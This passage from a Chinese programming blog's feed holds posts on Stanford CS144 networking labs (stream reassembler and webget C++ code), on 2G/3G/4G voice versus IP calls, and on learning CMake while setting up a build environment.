class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* stream_reassembler.hh */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StreamReassembler</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// Your code here -- add private members as necessary.</span></span><br><span class="line">    std::map&lt;<span class="type">size_t</span>, <span class="type">char</span>&gt; buffer;  <span class="comment">// 用于放置未重组的子字符串</span></span><br><span class="line">    <span class="type">size_t</span> sequence_num = <span class="number">0</span>;        <span class="comment">// 标记应该接收到的下一个序列号</span></span><br><span class="line">    <span class="type">size_t</span> buffer_size = <span class="number">0</span>;         <span class="comment">// 表示buffer中缓存的所有子字符串的总字节数（无重复）</span></span><br><span class="line">    <span class="type">size_t</span> ended_seq  = std::numeric_limits&lt;<span class="type">size_t</span>&gt;::<span class="built_in">max</span>() - <span class="number">2</span>;    <span class="comment">// 流的最后一个字节的序号</span></span><br><span class="line">    <span class="type">bool</span> _eof = <span class="literal">false</span>;   <span class="comment">// 流是否到达结尾</span></span><br><span class="line">    ByteStream _output;  <span class="comment">//!&lt; The reassembled in-order byte stream</span></span><br><span class="line">    <span class="type">size_t</span> _capacity;    <span class="comment">//!&lt; The maximum number of bytes </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*stream_reassembler.cc*/</span></span><br><span class="line">StreamReassembler::<span class="built_in">StreamReassembler</span>(<span class="type">const</span> <span class="type">size_t</span> capacity) : <span class="built_in">buffer</span>(), _output(capacity), _capacity(capacity)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StreamReassembler::push_substring</span><span class="params">(<span class="type">const</span> string &amp;data, <span class="type">const</span> <span class="type">size_t</span> index, <span class="type">const</span> <span class="type">bool</span> eof)</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> last_seq = index + data.<span class="built_in">length</span>();    <span class="comment">// 该子字符串最后一个字节的下一个序列号</span></span><br><span class="line">    <span class="keyword">if</span>(eof)&#123;</span><br><span class="line">        <span class="comment">// 子字符串处于流的末尾</span></span><br><span class="line">        <span class="keyword">if</span>(data != <span class="string">&quot; &quot;</span>)&#123;</span><br><span class="line">            ended_seq = last_seq - <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            ended_seq = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!eof &amp;&amp; data == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(last_seq &lt;= sequence_num &amp;&amp; data != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="comment">// 子字符串已经重组</span></span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(index &lt; sequence_num)&#123;</span><br><span class="line">        <span class="comment">// 进行字符串裁剪</span></span><br><span class="line">        <span class="built_in">push_substring</span>(data.<span class="built_in">substr</span>(sequence_num - index), sequence_num, eof);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; data.<span class="built_in">length</span>(); ++i)&#123;</span><br><span class="line">        <span class="comment">// 将子字符串先缓存到buffer中</span></span><br><span class="line">        buffer.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(index + i, data[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    buffer_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> iter = buffer.<span class="built_in">begin</span>(); iter != buffer.<span class="built_in">end</span>(); iter++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buffer_size &gt;= _capacity - _output.<span class="built_in">buffer_size</span>())&#123;</span><br><span class="line">            buffer.<span class="built_in">erase</span>(iter, buffer.<span class="built_in">end</span>());</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        buffer_size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> iter = buffer.<span class="built_in">begin</span>(); iter-&gt;first == sequence_num &amp;&amp; iter != buffer.<span class="built_in">end</span>();)&#123;</span><br><span class="line">        <span class="comment">// 判断是否可以写入重组字符串</span></span><br><span class="line">        _output.<span class="built_in">write</span>(<span class="built_in">string</span>(<span class="number">1</span>, iter-&gt;second));</span><br><span class="line">        buffer_size--;      <span class="comment">// 更新buffer大小</span></span><br><span class="line">        sequence_num++;     <span class="comment">// 更新期望的下一个序列号</span></span><br><span class="line">        iter = buffer.<span class="built_in">erase</span>(iter); <span class="comment">// 释放已读入的字符串内存</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((sequence_num<span class="number">-1</span>) == ended_seq)&#123;</span><br><span class="line">        _eof = <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(eof &amp;&amp; data == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        _eof = eof;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(_eof &amp;&amp; buffer.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        _output.<span class="built_in">end_input</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">StreamReassembler::unassembled_bytes</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> buffer_size; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StreamReassembler::empty</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">if</span>(buffer_size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>; <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br></pre></td></tr></table></figure><h1 id="总结反思"><a class="markdownIt-Anchor" href="#总结反思"></a> 总结反思</h1><ol><li>对 C++的 STL 不熟悉，因此在缓冲区的模拟中走了弯路</li><li>对于基本算法不熟练，需要多刷题提升思维</li><li>保持初心，但不要钻牛角尖，学会知难而退，学习他人的代码是如何设计构建的，也是学习的一个方法</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lab-1-项目构建&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#lab-1-项目构建&quot;&gt;&lt;/a&gt; Lab 1 项目构建&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;/2024/08/11/CS144-Lab1/startcode.png&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>手机电话和微信语音——从两种即时通信技术的区别看通信网络的发展</title>
    <link href="http://example.com/2024/08/08/%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%8F%91%E5%B1%95/"/>
    <id>http://example.com/2024/08/08/%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%8F%91%E5%B1%95/</id>
    <published>2024-08-08T07:58:41.419Z</published>
    <updated>2024-08-09T08:06:51.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题产生"><a class="markdownIt-Anchor" href="#问题产生"></a> 问题产生</h2><p>在一次帮家里老人办理运营商套餐时，我建议长辈要打电话的话就尽量用微信来打电话，而少用拨号的方式拨打移动电话。对此我和长辈的解释是：前者用的是“流量”，后者用的是“话费”，只要在有 WiFi 的环境下打微信电话就能不花话费了。但对于两者通话技术的区别，我却发现自己也是完全不了解，更别说和其他人解释“手机电话”和“微信电话”为什么一个用的是话费而另一个用的是流量了。</p><p>恰好最近在读《自顶向下》的无线网络和移动网络一章，便打算查阅书本和搜集网上资料，满足一下自己的好奇心，也借此机会锻炼一下写文章的能力。希望通过问题的引入，我们能够粗浅地从技术层面了解 2G-3G-4G 的通信网络发展。</p><h2 id="讨论背景和问题概述"><a class="markdownIt-Anchor" href="#讨论背景和问题概述"></a> 讨论背景和问题概述</h2><p>无论是用手机移动拨号还是通过微信语音视频进行通讯，手机作为（移动）主机（host）位于因特网边缘，是所谓的** “边缘设备” ** 。而这个边缘设备与我们平常的主机不同之处在于它是无线的（wireless），也就是说它和网络通信的下一跳（hop）之间是通过电磁波进行数据交换的。在接下来的探讨中，我们将注意力主要放在无线链路上，也即 OSI 参考模型中的链路层（Link layer），而不去讨论网络层相关的内容（也不相关）和物理层相关的知识（物理很差，不懂）。</p><p>当我们在讨论手机拨号和微信电话之间的区别时，我们在讨论什么？<strong>实际上，这个问题的实质是传统的电话通话和通过互联网进行的语音视频通话在技术实现上的区别是什么。</strong> 如果要用一句话精简地概括，那二者的区别就是一个是基于 2G 传输的无线电波语音，一个是基于 3G 传输的 IP 语音。</p><h2 id="2g-蜂窝网体系"><a class="markdownIt-Anchor" href="#2g-蜂窝网体系"></a> 2G 蜂窝网体系</h2><h4 id="2g-蜂窝网体系结构的组件"><a class="markdownIt-Anchor" href="#2g-蜂窝网体系结构的组件"></a> 2G 蜂窝网体系结构的组件</h4><p><img src="/2024/08/08/%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%8F%91%E5%B1%95/2g.png" alt="2G网络体系结构"></p><ul><li><strong>MS(Mobile Station)</strong>: MS is the user equipment such as cellphone, mobile computer or any other device which carries <a href="https://umutcanbolat.com/sim-card-basics"><strong>SIM card</strong></a> and have the software to communicate with the GSM network. In 3G systems, MS is referred to as UE (User Equipment).（待接入的边缘设备)</li><li><strong>BTS (Base Transreceiver Station)</strong>: BTS is the equipment used for transmitting and receiving radio signals between MS and a network. BTS’s create cell structure. Mobile devices under the cell can communicate with the rest of the network. BTS’s are connected to BSC’s which controls them.（通信的收发基站）</li><li><strong>BSC (Base Station Controller)</strong>:BSC is the intelligence behind the BTS’s. It can control multiple BTS’s. BSC is responsible for allocation of radio frequencies, power and signal measurements. BSC also controls handover between one cell to another if they are under the control of same BSC.（基站控制器，管理各个蜂窝中的基站）</li><li><strong>MSC (Mobile Switching Center)</strong>: MSC is the core element of the Network Switching Subsystem (NSS). It is responsible for routing voice calls and SMS. MSC sets up end-to-end <strong>circuit switched</strong> connection between subscribers. It handles mobile services such as <strong>registration</strong>, <strong>authentication</strong>, <strong>location updating</strong> and Inter <strong>BSC-Intra MSC handovers</strong>.（移动交换中心，处理各个 BSC 传递的数据，完成注册、认证、位置更新等服务）</li><li><strong>GMSC (Gateway MSC)</strong>:GMSC is a special kind of MSC that is used to route calls outside the mobile network. Whenever a call for a mobile subscriber comes from outside the mobile network (PSTN), or the subscriber wants to make a call to somebody outside the mobile network the call is routed through the GMSC.（网关，接入公共电话网的最后一个节点）</li></ul><h4 id="拨号语音传输过程"><a class="markdownIt-Anchor" href="#拨号语音传输过程"></a> 拨号语音传输过程</h4><p>传统的蜂窝（Cellular）电话通过 PSTN（或蜂窝网络）传输语音信号，语音信号从模拟信号转化为数字信号并进行压缩，通过无线电波传输到运营商的基站，再通过核心网络传送到对方的电话。所以说，我们通过手机拨号是通过 2G 蜂窝网将我们的语音与电话网相连接，实现两个用户语音即时通信。</p><h2 id="3g-蜂窝网体系"><a class="markdownIt-Anchor" href="#3g-蜂窝网体系"></a> 3G 蜂窝网体系</h2><h4 id="3g-系统体系结构"><a class="markdownIt-Anchor" href="#3g-系统体系结构"></a> 3G 系统体系结构</h4><p><img src="/2024/08/08/%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%8F%91%E5%B1%95/3g.png" alt="3G网络体系结构"></p><ul><li>SGSN(Serving Generalized packet radio service Support Node): 服务通用分组无线服务支持节点，负责为移动节点交付（或接受）数据报，提供用户认证和切换，并维护移动节点的位置信息</li><li>GGSN(Gateway GPRS Support Node): 网关 GPRS 支持节点，从外部来看，它是移动节点数据报进入因特网的最后一个节点，看起来就是一个网络路由器</li></ul><p>我们可以看到 3G 是在 2G 的基础网络体系上增加了因特网相关的组件，并分离出无线电接入网（radio acess network）和核心网(core network)两个网络，在数据网的分支上，最终接入的节点是因特网。</p><h4 id="微信电话语音传输过程"><a class="markdownIt-Anchor" href="#微信电话语音传输过程"></a> 微信电话语音传输过程</h4><p>互联网语音（IP 语音）和视频通话使用的是 TCP/IP 协议栈。语音和视频数据被数字化后封装成数据包，通过互联网进行传输。这些数据包可能经过多个路由器和网络节点，最终到达对方的设备。所以说，我们进行微信电话时通过 3G 网络传输语音数据包，在因特网中不断转发直到与我们通信的目标终端。</p><h2 id="问题的答案"><a class="markdownIt-Anchor" href="#问题的答案"></a> 问题的答案</h2><p>由上面对 2G 和 3G 网络体系的介绍可知，这两种通话所使用的技术是有极大的区别的。传统电话依赖于<strong>专用的电信网络基础设施和协议</strong>（如 GSM、CDMA、LTE），而互联网通话依赖于<strong>通用的 IP 网络和互联网协议</strong>。当然二者也非完全不同，无论是传统电话还是互联网通话，最终都涉及到语音数据的数字化和传输，在语音传输过程中也都会通过蜂窝网络。</p><h2 id="4g-蜂窝网体系"><a class="markdownIt-Anchor" href="#4g-蜂窝网体系"></a> 4G 蜂窝网体系</h2><h4 id="4g-系统体系结构"><a class="markdownIt-Anchor" href="#4g-系统体系结构"></a> 4G 系统体系结构</h4><p><img src="/2024/08/08/%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%8F%91%E5%B1%95/4g.png" alt="4G网络体系结构"><br>由 3GPP 提出的 4G 长期演进网络（LTE），较之 3G 系统而言有两个创新：一个<strong>全 IP 核心网</strong>和一个<strong>加强的无线电接入网</strong>。</p><ul><li>是一种统一的，全 IP 的网络体系结构。上面介绍的 3G 网络对于语音和数据流量具有分离的网络组件和路径，而 4G 体系结构将语音和数据都承载在 IP 数据报中（全 IP 的含义），来自/发往用户设备（UE），到分组网关（P-GW）——该网关将 4G 边缘网络连接到网络的其他部分。</li><li>4G 数据平面和控制平面清晰分离。</li><li>无线电接入网和全 IP 核心网之间清晰分离。</li></ul><hr><p><strong>参考资料：</strong></p><p><strong>1. <em>Computer Networking: A Top-Down Approach</em></strong><br><strong>2. <a href="https://umutcanbolat.com/2g-gsm-cellular-network-basics/">GSM 2G Cellular Network</a></strong><br><strong>3. <a href="https://dz.linkedin.com/in/ilyes-amokrane-lezzoum?trk=article-ssr-frontend-pulse_publisher-author-card">Architecture of Mobile Networks (2G, 3G and 4G)</a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;问题产生&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#问题产生&quot;&gt;&lt;/a&gt; 问题产生&lt;/h2&gt;
&lt;p&gt;在一次帮家里老人办理运营商套餐时，我建议长辈要打电话的话就尽量用微信来打电话，而少用拨号的方式拨打移动电话。对此我和长辈的解释是：前</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CMake教程</title>
    <link href="http://example.com/2024/08/01/CMake%E6%95%99%E7%A8%8B/"/>
    <id>http://example.com/2024/08/01/CMake%E6%95%99%E7%A8%8B/</id>
    <published>2024-08-01T13:07:28.068Z</published>
    <updated>2025-03-05T08:09:21.494Z</updated>
    
    <content type="html"><![CDATA[<h4 id="cmake-链接"><a class="markdownIt-Anchor" href="#cmake-链接"></a> CMake 链接</h4><p><a href="https://subingwen.cn/cmake/CMake-primer/">CMake 教程转载</a><br><a href="https://makefiletutorial.com/">Makefile tutorial</a></p><p>想了解什么是 <code>CMake</code>，首先我们要知道 <code>Make</code> 工具。若源文件、头文件不多，我们可以在命令行中手动写编译命令:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc hello.c</span><br></pre></td></tr></table></figure><p>但是当项目庞大起来后，假设<code>hello.c</code>依赖与 <code>a.c</code>、<code>b.c</code>，而 <code>a.c</code> 又依赖于库 <code>w.lib</code>，每一次编译，我们都要重新编写一次 gcc 编译命令行吗？所以，GNU 发明了 <code>make</code> 这个工具软件，可以编写 <code>makefile</code> 文件来指定特定的项目构建过程，当项目一个文件的代码更改时，我们只需要重新 make 一下就可以了。</p><p>虽然<code>make</code>大大简化了项目的构建过程，但依然有很多不足，比如：</p><ol><li>make 对于类 unix 系统是通用的，但对 windows 系统并不友好(<strong>不能跨平台</strong>)</li><li>make 语法简单，也就导致了它功能的限制</li><li>不同编译器的语法规则不同，编写的 makefile 语法如果适合 GCC 则不适合 MSVC(<strong>不兼容</strong>)</li></ol><p>所以，<code>CMake</code>就应运而生了。<strong>CMake 是比 Make 更高一层的工具</strong>，Make 是编写对应编译器的 makefile 从而实现编译，而 CMake 是写一份独立的 CmakeList.txt 文件，然后该文件会根据当前系统环境选择适合的构建生成器（如 VS 或者 make），然后将 CmakeList.txt 翻译为适合的文件，再进一步调用系统编译器进行项目构建。</p><ul><li><strong>定义</strong>： CMake 是一个<strong>跨平台的构建系统生成工具</strong>。它用于配置和管理项目的构建过程，可以生成特定<strong>构建工具</strong>（如 Make 和 Ninja）所需要的<strong>构建（配置）文件</strong>（如 Makefile 或 build.ninja）。</li><li><strong>功能</strong>：CMake 提供了一个<strong>统一的接口</strong>（CMakeLists.txt 文件）来描述项目的构建逻辑，并根据目标平台生成相应的构建文件。CMake 支持多种编译器（不同语言）和构建工具（如 C++的 make 和 Ninja），能够处理复杂的依赖关系和跨平台兼容性问题。</li></ul><h4 id="为什么会接触到-cmake"><a class="markdownIt-Anchor" href="#为什么会接触到-cmake"></a> 为什么会接触到 CMake</h4><p>为了开始 CS144 的 lab，我前置除了需要学习 C+ +外，还需要配置好实验的环境，而环境又分为 C+ +的环境和官方给的项目环境，于是…<br>没错，lab 还没有难到我的时候，环境的配置便给了我当头一棒。除了 C<ins>基本的编译工具 gcc/g</ins>要安装了解外，还需要 clone 官方的 start code。一开始打算做最新的<code>Minnow</code>版本，但官方对 g++和 Ubuntu 的版本要求太高了，我的 WSL 只是 22.04，完全没达到实验的标准，因此在 cmake 的时候不出所料地遇到了问题 TAT<br><img src="/2024/08/01/CMake%E6%95%99%E7%A8%8B/CMake%E5%A4%B1%E8%B4%A5.jpg" alt="CMake失败.jpg"><br>由于不想继续折腾系统版本，于是我又去翻到了<code>Sponge</code>版的 start code，继续 cmake，这次终于是没问题了，不过后面 make 进行编译时又又出现了问题<br><img src="/2024/08/01/CMake%E6%95%99%E7%A8%8B/make%E5%A4%B1%E8%B4%A5.jpg" alt="make失败.jpg"><br>原来是<code>libsponge/util/adress.cc</code>没有加上头文件<code>&lt;array&gt;</code>，加上后最终编译成功！至此，终于可以开始愉快的实验了，…吗？<img src="/2024/08/01/CMake%E6%95%99%E7%A8%8B/make%E6%88%90%E5%8A%9F.jpg" alt="make成功.jpg"><br>之所以环境的构建如此坎坷，我觉得最主要的原因是这些工具我完全不了解，所以遇到问题只能上网搜，然后按图索骥地尝试解决问题。当然这样做效率是很低下的，只有跟着解决方法走，实际能不能解决，那就得看最后结果了，我也因此耗费了很多时间。而这个时间我觉得花的并没有价值，只是照葫芦画瓢地搬弄别人给出的方法，而我完全不知道这些操作是什么意思，因此要想真的在这个过程中学到东西，必须是得扎实地去了解这个工具——CMake。</p><h4 id="感悟与反思"><a class="markdownIt-Anchor" href="#感悟与反思"></a> 感悟与反思</h4><p>最近学习<em>C++ Primer Plus</em>时看到一句话：<strong>不要害怕犯错误，因为在解决问题的过程中学到的知识，比生搬硬套而不犯错误时要多得多。</strong> 我的许多实践都验证过这句话的正确性。确实，在解决错误的过程中我们能学习到很多东西，但是我们不能生搬硬套而不去思考为什么这么做就能解决问题，下次遇到相关的问题我又应该如何解决？授人以鱼不如授人以渔，犯错误是好事，而在寻找解决办法并在痛苦的过程中学习才是犯错带来的最大收益。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;cmake-链接&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#cmake-链接&quot;&gt;&lt;/a&gt; CMake 链接&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://subingwen.cn/cmake/CMake-primer/&quot;&gt;CMa</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Standford CS144 Lab 0</title>
    <link href="http://example.com/2024/07/18/CS144-lab0/"/>
    <id>http://example.com/2024/07/18/CS144-lab0/</id>
    <published>2024-07-18T02:47:21.980Z</published>
    <updated>2024-08-10T06:06:48.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序言"><a class="markdownIt-Anchor" href="#序言"></a> 序言</h2><p>满怀热忱开始 cs144 的旅途，第一个碰到的困难便是<strong>环境搭建</strong>。在这三天时间里不断配置、删库、配置，看了不知道多少博客（许多都是跟着文档一笔带过）和评论，最后终于完成了实验环境的搭建！</p><p>最初是打算做 SU CS144 最新的 2024 Spring <code>minnow</code>版本，但是它要求需要 ubuntu23、gcc 和 g++13 以上，如果环境没有达到实验要求，后面的 cmake 会出错。因此最后还是 2021 的<code>Sponge</code>版（听说这个版本的 lab4 TCP Connection 特别难，而在 minnow 版中直接换成了另一个简单的 lab）。</p><h2 id="环境配置"><a class="markdownIt-Anchor" href="#环境配置"></a> 环境配置</h2><p>我选择的是<a href="https://blog.csdn.net/yanbober/article/details/138245581">WSL2+VScode</a>的方式进行实验，WSL2 安装起来非常简便而且体量轻，不仅可以在基于 Linux 的环境中进行开发，使用特定于 Linux 的工具链和实用程序，还可以在 Windows 上舒适地运行和调试基于 Linux 的应用程序。</p><p>工具链：gcc &amp;g++ 13.1.0、gdb 12.1、make（由于我对于 gcc、g<ins>编译器，还有<code>cmake</code>、<code>make</code>、<code>gdb</code>都不了解，甚至 C</ins>也是现学现用的，因此配置过程中遇到了非常多的问题，耗费了大量时间和精力）<br><img src="/2024/07/18/CS144-lab0/%E5%B7%A5%E5%85%B7.png" alt="工具"></p><h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h2><h3 id="1-从官网下载解压-gcc-和-g"><a class="markdownIt-Anchor" href="#1-从官网下载解压-gcc-和-g"></a> 1. 从官网下载解压 gcc 和 g++</h3><p><a href="https://gcc.gnu.org/">https://gcc.gnu.org/</a></p><h3 id="2-拉取-start-code"><a class="markdownIt-Anchor" href="#2-拉取-start-code"></a> 2. 拉取 start code</h3><h4 id="获取项目框架"><a class="markdownIt-Anchor" href="#获取项目框架"></a> –获取项目框架</h4><p>由于 Stanford 官方已经把<code>Sponge</code>的代码库换成了最新的<code>Minnow</code>的库，所以为了拉到开始代码得去拉别人已经做好的实验，再用 git 回退到初始状态。非常感谢老哥 LRL52 提供的<a href="https://github.com/LRL52/CS144-Sponge">Lab start code</a></p><h4 id="git-关联远端仓库"><a class="markdownIt-Anchor" href="#git-关联远端仓库"></a> –git 关联远端仓库</h4><ol><li>由于 start code 是从别人的代码仓库上 clone 到本地的，如果此时直接关联自己的远程仓库<code>git remote add origin &lt;URL&gt;</code>，则会报错<code>error: remote origin already exists</code></li><li>解决方法： 1. <code>git remote rm origin</code>删除关联的远程库 2. <code>git remote add origin &lt;URL&gt;</code>关联自己的远程库 3. <code>git push origin main</code>把本地仓库推送到远程仓库（Github 配置 SSH）<br><img src="/2024/07/18/CS144-lab0/git.png" alt="git"></li></ol><h3 id="3-根据官方文档初始化项目"><a class="markdownIt-Anchor" href="#3-根据官方文档初始化项目"></a> 3. 根据官方文档初始化项目</h3><p><img src="/2024/07/18/CS144-lab0/%E8%A6%81%E6%B1%82.png" alt="要求"><br>在 make 时候出现了问题：<br><img src="/2024/07/18/CS144-lab0/make%E5%A4%B1%E8%B4%A5.png" alt="make失败"><br>查了一下发现是<code>/libsponge/util/address.hh</code>没有包含<code>&lt;array&gt;</code>库<br><img src="/2024/07/18/CS144-lab0/make%E6%88%90%E5%8A%9F.png" alt="make成功"></p><h3 id="4-反思"><a class="markdownIt-Anchor" href="#4-反思"></a> 4. 反思</h3><p>经历了三天的挫折，环境最终还是搭建好了，但我感觉自己在这一段痛苦的<strong>实践中收获甚微</strong>：感觉自己的信息检索能力增强了些，但具体工具的知识我却没有花时间去了解。当然我的<strong>重心</strong>还是要放在具体实验上的，<strong>如果花时间在这些“无足轻重”的事情上，或许会顾此失彼因小失大</strong>。</p><h2 id="part1-完成-webget"><a class="markdownIt-Anchor" href="#part1-完成-webget"></a> Part1-完成 webget</h2><h3 id="程序要求"><a class="markdownIt-Anchor" href="#程序要求"></a> 程序要求</h3><p><img src="/2024/07/18/CS144-lab0/webget.png" alt="webget"><br>这个<code>webget</code>函数的功能就是将我们一开始手打的<code>HTTP</code>请求报文写进程序里，并且发送到目的服务器，获得服务器返回的响应报文，显示在终端。</p><p>首先我们要明确两个进程连接的过程。这个过程涉及客服端/服务端的<code>socket</code>创建，以及接下来的三次握手建立全双工（bi-directional）的（持续/非持续）连接。webget 只要求我们建立客户端的 socket，并和给定的目的主机<code>host</code>进行连接。我们知道建立 TCP 连接需要三次握手（three-way handshake），但我们在 socket 面向应用层的这端不需要显示地对三次握手进行编程，因为这个过程交由我们的操作系统隐式完成了。不仅如此，很多轮子官方也给我们搓好了，需要我们读一下<code>/libsponge/util</code>目录下的类接口（完成 webget 需要了解<code>address.hh</code>、<code>socket.hh</code>），也可以看<a href="https://cs144.github.io/doc/lab0/">官方的 library 网站</a>。</p><h3 id="实验过程与源码"><a class="markdownIt-Anchor" href="#实验过程与源码"></a> 实验过程与源码</h3><p>这是我写的 webget，因为第一次做实验一开始无处下手，所以先自己凭感觉写了一次，然后借鉴其他朋友的代码进行了修改（1. 发送报文后关闭连接 2.while 判断读到文件末尾的接口）。运行<code>./apps/webget cs144.keithw.org /hello</code>（根据<code>makefile</code>编译的 webget 可执行程序应该在<code>build</code>目录下）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*webget.cc*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_URL</span><span class="params">(<span class="type">const</span> string &amp;host, <span class="type">const</span> string &amp;path)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//通过默认构造函数（default constructor）创建客户端socket对象</span></span><br><span class="line">    TCPSocket client_socket = <span class="built_in">TCPSocket</span>();</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//创建server的地址</span></span><br><span class="line">    Address server_address = <span class="built_in">Address</span>(host, <span class="string">&quot;http&quot;</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//TCP三次握手（操作系统内核隐式完成）后创建TCP连接</span></span><br><span class="line">    client_socket.<span class="built_in">connect</span>(server_address);  </span><br><span class="line">   </span><br><span class="line">    <span class="comment">//发送Http GET请求报文</span></span><br><span class="line">    client_socket.<span class="built_in">write</span>(<span class="string">&quot;GET &quot;</span> + path + <span class="string">&quot; HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">    client_socket.<span class="built_in">write</span>(<span class="string">&quot;Host: &quot;</span> + host + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    client_socket.<span class="built_in">write</span>(<span class="string">&quot;Connection: close\r\n&quot;</span>);</span><br><span class="line">    client_socket.<span class="built_in">write</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//关闭TCP单向连接（Write）</span></span><br><span class="line">    client_socket.<span 